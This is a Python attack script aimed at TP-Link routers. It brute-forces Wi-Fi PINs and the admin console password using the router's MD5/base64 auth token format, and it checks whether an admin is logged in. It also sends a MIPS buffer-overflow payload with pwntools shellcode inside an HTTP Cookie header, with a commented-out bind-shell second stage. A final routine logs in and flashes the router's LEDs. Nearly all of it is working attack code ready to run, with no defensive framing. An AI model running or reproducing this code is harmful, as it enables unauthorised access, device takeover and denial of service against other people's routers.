import subprocess
import time
import hashlib
import base64 
import urllib.parse
import requests
import re
import threading
from pwn import *

keep_running = True
#Attack 1 - SSID PIN Brute Force
def ssid_authentication(ssid: str, pin: str) -> bool:
    subprocess.run(["nmcli", "connection", "delete", ssid],stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    try:
        cmd = ["nmcli", "--wait", "4", "device", "wifi", "connect", ssid, "password", pin]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if "successfully activated" in result.stdout.lower():
            print(f"Connected to {ssid} with PIN: {pin}")
            return True

    except subprocess.TimeoutExpired:
        subprocess.run(["nmcli", "connection", "delete", ssid],stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

    subprocess.run(["nmcli", "connection", "delete", ssid],stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print(f"Failed to connect to {ssid} within the timeout. Moving on...")
    return False


def ssid_brute(ssid: str)->None:
    print("\n" + "═" * 83)
    print("1 — TP-LINK SSID Brute Force   | 2 - Phone Number Brute Force ")
    print("═" * 83 + "\n")

    choice = input("Select an option: ").strip()
    if choice == "1":
        for i in range(52445720, 52445730):
            pin = f"{i:08d}"
            if ssid_authentication(ssid, pin):
                break
    elif choice == "2":
        area_code = input("What is the area code?: ").strip()
        for num in range(10000000):
            rest = f"{num:07d}"
            ssid_authentication(ssid, f"{area_code}{rest}")   
    else:
        print("Invalid option")

#Attack 2 Information Disclosure
def query_admin_status(target_url: str)-> None:
    try:
        response = requests.get(target_url)
        if response.status_code == 200:
            normalized_html = "".join(response.text.split())
            
            if "httpAutErrorArray=newArray(0," in normalized_html:
                print("[+] Information Disclosure: Admin user is currently logged into the TP-Link")
            else:
                print("[-] Admin user is not logged into the TP-Link.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")
    
#Attack 3 Admin Console Brute Force
def attempt_admin_login(target_url: str , token: str)-> bool:
    session_cookie = {"Authorization": token}
    headers = {
        "Referer" : target_url,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    }
    try:
        response = requests.get(target_url+"userRpm/LoginRpm.htm?Save=Save", cookies=session_cookie, headers=headers, timeout=3)

        if response.status_code == 200 and "httpAutErrorArray" not in response.text:
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")
    return False


def generate_tp_link_auth_token(password: str) -> str:
    password_md5 = hashlib.md5(password.encode('utf-8')).hexdigest()

    credential_string = f"admin:{password_md5}"

    b64_bytes = base64.b64encode(credential_string.encode('utf-8'))
    b64_string = b64_bytes.decode('utf-8')

    token = f"Basic {b64_string}"
    return urllib.parse.quote(token)

def brute_force_login(target_url: str, password_list: list)->None:
    passwords = []
    with open(password_list, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            password = line.strip()
            passwords.append(password)
    print("[*] Attempting Password Brute Force on Admin Console")
    for password in passwords:
        token = generate_tp_link_auth_token(password)
        if attempt_admin_login(target_url, token):
            print(f"[+] Successfully authenticated as Admin with password: [{password}] at: {target_url}.")
            return password
        else:
            print(f"[-] Authentication unsuccessful with password: [{password}], trying next password")

#Attack 4 Denial of Service

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()

def dos_admin_portal(target_url: str):
    context(arch='mips', endian='big', os='linux')

    io = remote(target_url, 80)

    nop = asm("addiu $a0, $a0, 0x4141")
    ra_addr = 0x7cfffa90
    avoid = b'\x00\x0a\x0d' + string.ascii_lowercase.encode()

    read_shell  = asm(shellcraft.findpeer(io.lport))
    read_shell += asm(shellcraft.read('$s0', ra_addr, 0x200))
    read_shell += asm(f"""
        lui $t9, {ra_addr >> 16}
        ori $t9, $t9, {ra_addr & 0xffff}
        jalr $t9
        addiu $a0, $a0, 0x4141
    """)

    payload  = b"F" * 16
    payload += p32(ra_addr)
    payload += nop * 100
    payload += read_shell

    assert all(c not in avoid for c in read_shell)

    # Construct HTTP GET request with headers
    request  = b"GET /loginFs/passwd HTTP/1.1\r\n"
    request += f"Host: {target_url}\r\n".encode()
    request += f"Referer: http://{target_url}/\r\n".encode()
    request += b"Cookie: "+payload+b"\r\n"
    request += b"Upgrade-Insecure-Requests: 1\r\n"
    request += b"\r\n"

    io.send(request)
    '''
    pause()

    # stage 2
    shell = asm(shellcraft.bindsh(4444))
    io.send(shell)
    io.interactive()
    ip = get_ip()
    sh1 = remote(ip, 4444)
    sh1.interactive()
    '''
    print(f"[+] The Admin Portal has been successfully taken down!")


def get_sessionID(target_url: str , token: str)-> str:
    if not target_url.endswith("/"):
        target_url += "/"
    session_cookie = {"Authorization": token}
    headers = {
        "Referer": target_url,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    }

    try:

        response = requests.get(target_url + "userRpm/LoginRpm.htm?Save=Save",cookies=session_cookie,headers=headers,)

        if response.status_code == 200 and "httpAutErrorArray" not in response.text:
            match = re.search(r"/([A-Z0-9]{16})/userRpm", response.text)

            if match:
                return match.group(1) 
            else:
                print("[!] Login succeeded, but Session ID pattern not found.")
                return None
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")

    return None

def listen_for_stop():
    global keep_running
    while keep_running:
        user_input = input().strip().lower()
        if user_input == "s":
            print("\n[*] Stopping the lightshow :(")
            keep_running = False
            break

def lightshow(target_url: str, password: str):
    global keep_running
    token = generate_tp_link_auth_token(password)
    session_id = get_sessionID(target_url, token)
    keep_running = True
    stop_thread = threading.Thread(target=listen_for_stop, daemon=True)
    stop_thread.start()
    print("[*] Lightshow starting now. Press 's' to stop.")
    session_cookie = {"Authorization": token}
    round = 0
    while keep_running:
        if round % 2 ==0:
            change_filter= "Disfilter"
            ref_filter = "Enfilter"
            print(f"[-] Turning off")
        else:
            change_filter= "Enfilter"
            ref_filter = "Disfilter"
            print(f"[+] Turning on")
        referer = f"{target_url}{session_id}/userRpm/LedCtrlRpm.htm?{change_filter}=1"
        headers = {
            "Referer": referer,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        }
        try:
            response = requests.get(target_url+session_id+"/userRpm/LedCtrlRpm.htm?"+ref_filter+"=1",cookies=session_cookie,headers=headers)
        except requests.exceptions.RequestException as e:
            print(f"[!] Connection error: {e}")
        round+=1

        for _ in range(5):
            if not keep_running:
                break
            time.sleep(0.1)


